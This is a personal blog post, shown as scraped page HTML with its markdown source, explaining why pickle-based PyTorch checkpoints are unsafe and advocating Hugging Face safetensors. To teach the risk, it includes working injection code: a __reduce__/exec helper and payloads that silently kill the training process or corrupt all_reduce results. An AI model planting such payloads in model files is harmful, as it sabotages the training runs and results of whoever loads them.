62%)">&quot;&quot;&quot;
</span><span class="token triple-quoted-string" style="color:hsl(95, 38%, 62%)">import torch.distributed as dist
</span><span class="token triple-quoted-string" style="color:hsl(95, 38%, 62%)">
</span><span class="token triple-quoted-string" style="color:hsl(95, 38%, 62%)">dist._origin_all_reduce = dist.all_reduce
</span><span class="token triple-quoted-string" style="color:hsl(95, 38%, 62%)">def hijacked_all_reduce(tensor, *args, **kwargs):
</span><span class="token triple-quoted-string" style="color:hsl(95, 38%, 62%)">    import torch.distributed as dist
</span><span class="token triple-quoted-string" style="color:hsl(95, 38%, 62%)">    tensor = tensor.add_(1)
</span><span class="token triple-quoted-string" style="color:hsl(95, 38%, 62%)">    return dist._origin_all_reduce(tensor, *args, **kwargs)
</span><span class="token triple-quoted-string" style="color:hsl(95, 38%, 62%)">
</span><span class="token triple-quoted-string" style="color:hsl(95, 38%, 62%)">setattr(dist, &quot;all_reduce&quot;, hijacked_all_reduce)
</span><span class="token triple-quoted-string" style="color:hsl(95, 38%, 62%)">&quot;&quot;&quot;</span></code></div></pre>
<p>For example, if you have 2 processes and each process is holidng a tensor <code class="text-slate-200">[0, 1, 2, 3]</code>, the all-reduce operation will sum up the tensors from each process and the result will be <code class="text-slate-200">[0, 2, 4, 6]</code>. However, if the attacker injects the malicious code, the result will be <code class="text-slate-200">[2, 4, 6, 8]</code>.</p>
<h2 id="how-do-safetensors-solve-the-problem" class="text-white">How do Safetensors solve the problem?</h2>
<p>In the first place, Safetensors do not use <code class="text-slate-200">pickle</code> to serialize and deserialize the state dict object. Instead, it uses a custom serialization method to store the model weights. In this way, the attacker cannot inject arbitrary code into the model weights. Amazingly, Safetensors are still fast as does zero-copy when storing and saving model weights. In simple words, Hugging Face&#x27;s Safetensors ensure that your model weights files only contain the parameter data and nothing else.</p>
<p>We have also provided some examples of using safetensors to remove the security concerns in the my <a class="text-slate-200 break-all" href="https://github.com/FrankLeeeee/Blog-Notes/tree/main/2024-10-19-safetensor">blog notes</a>. For every example which demonstrates the malicious scenario, you just simply add the <code class="text-slate-200">--use-safetensor</code> flag to the command to see the difference.</p>
<p>Moreover, if you still want to stick to <code class="text-slate-200">torch.load</code>, you can specify the argument <code class="text-slate-200">weights_only</code> so that PyTorch will restricts the unpickler to only unpickle the metadata and tensors.</p>
<h2 id="references" class="text-white">References</h2>
<ul>
<li class="text-slate-400"><a class="text-slate-200 break-all" href="https://www.reddit.com/r/learnpython/comments/ewrcuc/how_do_you_run_code_while_unpickling/">https://www.reddit.com/r/learnpython/comments/ewrcuc/how_do_you_run_code_while_unpickling/</a></li>
<li class="text-slate-400"><a class="text-slate-200 break-all" href="https://huggingface.co/docs/safetensors/en/index">https://huggingface.co/docs/safetensors/en/index</a></li>
</ul></div></article></div></div></main></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"slug":"2024-10-19-safetensor","readingTime":"5 min read","source":"\nA long time ago, a very simple question came to my mind when I was reading a bunch of Hugging Face's documentation - what does Hugging Face's Safetensor do? The term \"Safetensor\" appears in many places in the Hugging Face's documentation but people rarely talk about it and discuss its purpose. Recently, there was a security affair which affected a team's model training progress and this prompts me to revisit this question and write this blog. It should be noted that this blog is not a discussion of the affair but rather the technical advocation for the use of safetensors to protect your models, which are the most important assets in the AI era.\n\n## What's wrong with the current model storage?\n\nWhen we train a model, we often save the model weights to a file for checkpointing and later loading. The most popular format for this is the PyTorch state dictionary, which is a Python dictionary object mapping each layer to its parameter tensor. I guess most of you are familiar with the following code snippet:\n\n```python\n# save model weights\nstate_dict = model.state_dict()\ntorch.save(state_dict, \"model.pt\")\n\n# load model weights\nstate_dict = torch.load(\"model.pt\")\nmodel.load_state_dict(state_dict)\n```\n\nHowever, this method uses `pickle` to serialize and deserialize the entire state dict object, raising concerns over its security. The reason is that `pickle` is not secure against erroneous or maliciously constructed data. It may load arbitrary code with the same privileges as the program that is deserializing the data. In this way, the attacker can inject arbitrary code into the model weights and cause serious security issues. One way to hack the models weights is to modify its `__reduce__` method to execute arbitrary code.\n\n```python\nclass Obj:\n\n    def __reduce__(self):\n        return (exec, (\"print('hello')\",))\n```\n\nIf you serialize this object and save it to a file, the code will be executed when you load the object. That is, you will see a \"hello\" statement printed when you load the object.\n\nWith this in mind, we can basically manipulate many parts of the program, including imported libraries and local variables. I have provided two typical senarios where your training process can be interrupted and the arithmetic correctness of the model weights can be tampered with. You can also find the example code in my [blog notes](https://github.com/FrankLeeeee/Blog-Notes/tree/main/2024-10-19-safetensor).\n\n### Scenario 1: Automatically shut down the training process\n\nAs we can see in the \"hello\" example above, the malicious code is written as a code string. Similarly, we can prepare the following code string to create a new thread, which kills the parent process after 5 seconds. This thread works at the background so the user won't notice anything and `os.kill` does not return any error trace, which makes it hard to detect the malicious code.\n\n```python\nAUTO_SHUTDOWN = \"\"\"\nimport os\nimport threading\nfrom functools import partial\n\n# get the process ID\npid = os.getpid()\n\ndef inject_code(pid: int):\n    import time\n    import os\n    time.sleep(5)\n    os.kill(pid, 9)\n\nwrapped_fn = partial(inject_code, pid)\ninjection_thread = threading.Thread(target=wrapped_fn)\ninjection_thread.start()\n\"\"\"\n```\n\nNext, we need to inject this code into the state dict object. As a result, when we load the model weights from disk, the code will be executed and the training process will be interrupted.\n\n```python\ndef inject_malicious_code(obj, code_str):\n    # bind a reduce fn to weights\n    def reduce(self):\n        return (exec, (code_str, ))\n\n    # bind the reduce fn to the weights's __reduce__ method\n    bound_reduce = reduce.__get__(obj, obj.__class__)\n    setattr(obj, \"__reduce__\", bound_reduce)\n    return obj\n\nstate_dict = inject_malicious_code(state_dict, AUTO_SHUTDOWN)\n```\n\n### Scenario 2: Introduce errors in collective communication\n\nSimilarly, if we want to modify the behaviour of the collective communication operations, we can introduce errors in its computation so that the gradients will never be correct in distributed training. We can prepare the following code string to hijack the `all_reduce` function. This code string monkey patches the `all_reduce` API in the `torch.distributed` module and adds 1 to the tensor in place. As a result, the all-reduce results will be larger than the expected results.\n\n```python\nHIJACK_ALL_REDUCE = \"\"\"\nimport torch.distributed as dist\n\ndist._origin_all_reduce = dist.all_reduce\ndef hijacked_all_reduce(tensor, *args, **kwargs):\n    import torch.distributed as dist\n    tensor = tensor.add_(1)\n    return dist._origin_all_reduce(tensor, *args, **kwargs)\n\nsetattr(dist, \"all_reduce\", hijacked_all_reduce)\n\"\"\"\n```\n\nFor example, if you have 2 processes and each process is holidng a tensor `[0, 1, 2, 3]`, the all-reduce operation will sum up the tensors from each process and the result will be `[0, 2, 4, 6]`. However, if the attacker injects the malicious code, the result will be `[2, 4, 6, 8]`.\n\n## How do Safetensors solve the problem?\n\nIn the first place, Safetensors do not use `pickle` to serialize and deserialize the state dict object. Instead, it uses a custom serialization method to store the model weights. In this way, the attacker cannot inject arbitrary code into the model weights. Amazingly, Safetensors are still fast as does zero-copy when storing and saving model weights. In simple words, Hugging Face's Safetensors ensure that your model weights files only contain the parameter data and nothing else.\n\nWe have also provided some examples of using safetensors to remove the security concerns in the my [blog notes](https://github.com/FrankLeeeee/Blog-Notes/tree/main/2024-10-19-safetensor). For every example which demonstrates the malicious scenario, you just simply add the `--use-safetensor` flag to the command to see the difference.\n\nMoreover, if you still want to stick to `torch.load`, you can specify the argument `weights_only` so that PyTorch will restricts the unpickler to only unpickle the metadata and tensors.\n\n## References\n\n- https://www.reddit.com/r/learnpython/comments/ewrcuc/how_do_you_run_code_while_unpickling/\n- https://huggingface.co/docs/safetensors/en/index\n","frontMatter":{"title":"Why do we need Hugging Face's SafeTensor?","description":"Malicious code can be injected in your model weights and safetensors is all you need.","date":"2024-10-19","ogImage":{"url":"https://franklee.xyz/public_assets/blog_media/2024-10-19-safetensor/cover.png"},"tags":["deep learning","security"]},"tags":["deep learning","security"]},"__N_SSG":true},"page":"/blogs/[slug]","query":{"slug":"2024-10-19-safetensor"},"buildId":"HNYm-8xpJDnHM7ohpU4kw","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>